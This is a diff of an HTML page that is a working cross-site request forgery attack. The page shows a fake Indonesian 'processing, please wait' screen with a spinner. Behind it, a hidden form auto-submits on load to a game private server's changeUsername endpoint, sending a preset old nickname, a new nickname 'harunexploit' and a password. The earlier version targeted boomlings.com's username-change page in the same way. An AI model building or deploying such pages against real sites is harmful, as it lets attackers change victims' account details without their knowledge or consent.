@@ -1,11 +1,42 @@
+<!DOCTYPE html>
 <html>
-  <body onload="document.forms[0].submit()">
+<head>
+    <title>Situs Sedang Dimuat...</title>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 50px;">
+        <h2>Sedang memproses data, mohon tunggu...</h2>
+        <div class="loader"></div>
+    </div>
 
-    <form action="https://www.boomlings.com/database/accounts/changeusername.php" method="POST">
-      <input type="hidden" name="username" value=""> 
-      <input type="hidden" name="newusername" value="HarunIsCooking">
-      <input type="hidden" name="changeusername" value="Change Username">
+    <form id="csrf-form" action="https://www.rickgdps.xyz/datastore/dashboard/account/changeUsername.php" method="POST" style="display:none;">
+        <input type="hidden" name="oldnickname" value="haroenlegend" />
+        <input type="hidden" name="newnickname" value="harunexploit" />
+        <input type="hidden" name="password" value="123456" />
+        <input type="hidden" name="g-recaptcha-response" value="" />
     </form>
 
-  </body>
+    <script>
+        // Otomatis mengirimkan form setelah halaman dimuat
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        };
+    </script>
+
+    <style>
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</body>
 </html>
